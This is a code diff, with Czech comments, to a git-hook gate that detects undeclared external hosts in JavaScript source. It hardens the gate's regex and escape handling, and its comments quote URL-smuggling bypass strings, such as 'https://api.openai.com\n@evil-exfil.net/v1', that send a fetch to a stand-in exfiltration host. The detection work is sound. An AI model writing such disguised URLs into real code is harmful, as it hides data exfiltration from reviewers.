@@ -224,15 +224,19 @@ function walkAssets() {
  * Znaky, po kterých `/` začíná regulární literál a ne dělení. Standardní
  * heuristika: po nich nemůže stát operand, takže `/` musí otevírat regex.
  *
- * **`<`, `>` a `}` tu schválně NEJSOU.** S `<` v sadě otevřela uzavírací JSX
- * značka `</div>` falešný literál, ten doběhl k dalšímu `/` v následující URL,
- * spolkl přitom jednu uvozovku, stav uvozovek se rozešel a `//` v cestě se pak
- * čtlo jako komentář — takže zbytek řádku zmizel. Naměřeno reviewem nad
- * `a52bb71`: nedeklarovaný host za JSX na témž řádku prošel zeleně, zatímco
- * verze bez přeskakování regexů ho našla. Zneviditelnit víc zdroje než předtím
- * není oprava, je to nová slepá skvrna.
+ * **`<` tu schválně NENÍ, `>` ano.** S `<` v sadě otevřela uzavírací JSX značka
+ * `</div>` falešný literál, ten doběhl k dalšímu `/` v následující URL, spolkl
+ * přitom jednu uvozovku, stav uvozovek se rozešel a `//` v cestě se pak čtlo
+ * jako komentář — takže zbytek řádku zmizel (naměřeno nad `a52bb71`).
+ *
+ * **`>` se ale vyhodit nesmělo a byla to druhá slepá skvrna.** Bez něj se
+ * `(s) => /['"]/.test(s)` čte jako dělení, uvozovka uvnitř otevře režim řetězce
+ * a host na dalším řádku zmizí — ověřeno, `hostsIn` vrátilo prázdno. Šipka je
+ * v tomhle repu běžnější než cokoli, co `>` mimo sadu chránilo. JSX se pozná
+ * podle `<` před lomítkem, ne podle `>` za značkou; `}` zůstává venku, protože
+ * ho nic nepotřebuje a dělení za `}` je pravděpodobnější než regex.
  */
-const REGEX_MAY_FOLLOW = new Set(['', '(', ',', '=', ':', '[', '!', '&', '|', '?', '{', ';', '+', '-', '*', '%', '~', '^']);
+const REGEX_MAY_FOLLOW = new Set(['', '(', ',', '=', ':', '[', '!', '&', '|', '?', '{', ';', '+', '-', '*', '%', '~', '^', '>']);
 
 /** Klíčová slova, po kterých platí totéž, jen končí písmenem (`return /x/`). */
 const REGEX_MAY_FOLLOW_WORD = new Set(['return', 'typeof', 'case', 'in', 'of', 'do', 'else', 'yield', 'await', 'delete', 'void', 'instanceof', 'new']);
@@ -267,7 +271,23 @@ function endOfRegex(source, start) {
   return -1;
 }
 
-/** Krátké escapy s vlastním významem. Zbytek (`\'`, `\\`, `\/`) je znak sám za sebe. */
+/**
+ * Značka za znak, který **prohlížeč z URL zahodí** (`\t`, `\r`, `\n`) — WHATWG
+ * URL je odstraňuje, takže `fetch('https://a.io\n@zly.net/v1')` jde na `zly.net`.
+ * Kdyby se dekódovaly na skutečné bílé místo, nešly by odlišit od mezery, kterou
+ * někdo do věty v řetězci napsal schválně, a brána by hlásila každou takovou větu.
+ * Značka není bílé místo ani znak URL, takže shodu ukončí a jde se podle ní poznat.
+ */
+const INVISIBLE = '\u0001';
+
+/**
+ * Krátké escapy s vlastním významem. Zbytek (`\'`, `\\`, `\/`) je znak sám za sebe.
+ *
+ * `\n`, `\r` a `\t` tu mají **skutečný znak**, ne značku. Značku nasazuje jedno
+ * jediné místo, `decodeEscapeMarked`, protože totéž jde napsat i unicode zápisem
+ * a dvě místa se stejným úkolem znamenají, že mutační kontrola nad jedním z nich
+ * nic neprokáže — jeden mutant tady přežil právě proto.
+ */
 const SHORT_ESCAPES = { n: '\n', r: '\r', t: '\t', b: '\b', f: '\f', v: '\v' };
 
 /**
@@ -303,6 +323,19 @@ function decodeEscape(source, i) {
 }
 
 /**
+ * Dekódovaný znak, který `fetch` z URL zahodí, dostane značku — ať byl zapsaný
+ * krátkým escapem, nebo jeho unicode zápisem. Bez toho by druhý zápis obcházel
+ * to, co první hlídá, a obcházel by ho stejným způsobem.
+ */
+function decodeEscapeMarked(source, i) {
+  const decoded = decodeEscape(source, i);
+  if (decoded.text === '\n' || decoded.text === '\r' || decoded.text === '\t') {
+    return { text: INVISIBLE, length: decoded.length };
+  }
+  return decoded;
+}
+
+/**
  * Odstraní komentáře, řetězce nechá. Rozhoduje to o tom, co je *volaný* endpoint:
  * URL v dokumentačním komentáři nikdo nezavolá, URL v řetězci ano. Regulárním
  * výrazem to nejde — `'http://x' // pozn.` má obojí na jednom řádku a naivní
@@ -335,13 +368,16 @@ export function stripComments(source) {
     const next = source[i + 1];
     if (quote) {
       if (c === '\\') {
-        const { text, length } = decodeEscape(source, i);
+        const { text, length } = decodeEscapeMarked(source, i);
         out += text;
         i += length;
         continue;
       }
       if (c === quote) quote = null;
-      out += c;
+      // Skutečný konec řádku uvnitř šablonového literálu je totéž, co `\n` v
+      // apostrofech: `fetch` ho z URL zahodí. Musí dostat stejnou značku, jinak
+      // by se stejná obcházka napsala o řádek níž a prošla.
+      out += c === '\n' || c === '\r' || c === '\t' ? INVISIBLE : c;
       i += 1;
       continue;
     }
@@ -409,7 +445,56 @@ export function modelIdsIn(source) {
  * legitimní escape není a `https://a.io\@zly.net` je přesně ten tvar, který má brána
  * zastavit.
  */
-const URL_IN_SOURCE = /https?:\/\/(?:\[[^\]\s"'`]*\][^\s"'`<>(){}[\]$,;]*|[^\s"'`<>(){}[\]$,;]+)/gi;
+const URL_IN_SOURCE = /https?:\/\/(?:\[[^\]\s"'`]*\][^\s"'`<>(){}[\]$,;\u0001]*|[^\s"'`<>(){}[\]$,;\u0001]+)/gi;
+
+/**
+ * Co se z nálezu smí vypsat. Brána běží v git hooku a její výstup jde do
+ * terminálu i do CI logu, takže **cesta ani query se netisknou nikdy** — reset
+ * token ve cestě nebo `?token=` v query je přesně ten údaj, který by tím unikl.
+ * Zbývá schéma a soubor, a to na dohledání stačí.
+ */
+function safeShape(raw) {
+  const scheme = /^https?:/i.exec(raw)?.[0]?.toLowerCase() ?? 'http(s):';
+  return `${scheme}//…`;
+}
+
+/**
+ * Skončila shoda uprostřed autority? Znaková třída končí i na znacích, které
+ * v hostu klidně pokračují — `$ , ; ( { [` a `INVISIBLE`. Když se za shodou
+ * takový znak objeví a shoda přitom **nedošla ani k první `/` za autoritou**,
+ * host se určit nedá a odhadnout ho je horší než to přiznat.
+ *
+ * Přesně tudy vedly obě cesty, které přežily první remediaci:
+ * `'https://api.openai.com\n@evil-exfil.net/v1'` a
+ * `'https://api.openai.com$@evil-exfil.net/v1'` obojí vrátilo `api.openai.com`,
+ * což je registrovaný host — a `fetch` přitom `\n` z URL zahazuje a jde na
+ * `evil-exfil.net`.
+ *
+ * **Skutečná mezera v sadě není**, a to je ten rozdíl: `'viz https://a.io a dál'`
+ * je věta v řetězci, ne useknutá autorita. Rozlišit je jde jen proto, že
+ * neviditelné znaky mají po dekódování vlastní značku.
+ *
+ * `` `https://a.io/${id}` `` taky projde: shoda došla za autoritu, takže se za
+ * běhu skládá cesta, ne host.
+ */
+const AUTHORITY_MAY_CONTINUE = new Set(['$', ',', ';', '(', '{', '[', '@', INVISIBLE]);
+
+function authorityTruncated(stripped, match) {
+  const raw = match[0];
+  const afterScheme = raw.slice(raw.indexOf('//') + 2);
+  if (/[/?#]/.test(afterScheme)) return false;
+  if (!AUTHORITY_MAY_CONTINUE.has(stripped[match.index + raw.length] ?? '')) return false;
+
+  // `http://127.0.0.1:${port}` je useknuté v portu, ne v hostu, a ten host je
+  // loopback. Hlásit ho by znamenalo nález na každém lokálním serveru v repu —
+  // a nález, který se nedá umlčet jinak než `--no-verify`, tlačí přesně tam.
+  //
+  // **Co se tím vzdává, řečeno nahlas:** `http://127.0.0.1:${x}@zly.net/` tahle
+  // výjimka propustí. Je to ale týž případ, který kontrola 5 v hlavičce už
+  // přiznává — host složený za běhu nevidí — ne nový ústupek.
+  const determinable = afterScheme.slice(afterScheme.lastIndexOf('@') + 1).split(':')[0];
+  return !NOT_EXTERNAL.test(determinable);
+}
 
 /**
  * Hosty **z rozparsované URL**, ne podřetězcem. Lexikální výřez `[A-Za-z0-9.\-]+`
@@ -420,23 +505,18 @@ const URL_IN_SOURCE = /https?:\/\/(?:\[[^\]\s"'`]*\][^\s"'`<>(){}[\]$,;]*|[^\s"'
  * Neparsovatelná URL se **hlásí**, ne zahazuje. Prefix `https?://` už padl, takže
  * co se za ním nedá přečíst, je nález, ne šum.
  */
-/**
- * Co se z nálezu smí vypsat. Brána běží v git hooku a její výstup jde do
- * terminálu i do CI logu, takže **cesta ani query se netisknou nikdy** — reset
- * token ve cestě nebo `?token=` v query je přesně ten údaj, který by tím unikl.
- * Zbývá schéma, host a soubor, a to na dohledání stačí.
- */
-function safeShape(raw) {
-  const scheme = /^https?:/i.exec(raw)?.[0]?.toLowerCase() ?? 'http(s):';
-  return `${scheme}//…`;
-}
 
 export function hostsIn(source) {
   const found = new Set();
-  for (const match of stripComments(source).matchAll(URL_IN_SOURCE)) {
+  const stripped = stripComments(source);
+  for (const match of stripped.matchAll(URL_IN_SOURCE)) {
     const raw = match[0].replace(/[.,;:]+$/, '');
     if (raw.includes('\\')) {
       found.add(`${safeShape(raw)} — URL nese zpětné lomítko, host se z ní nedá určit`);
+      continue;
+    }
+    if (authorityTruncated(stripped, match)) {
+      found.add(`${safeShape(raw)} — autorita URL pokračuje za koncem literálu, host se nedá určit`);
       continue;
     }
     let url;
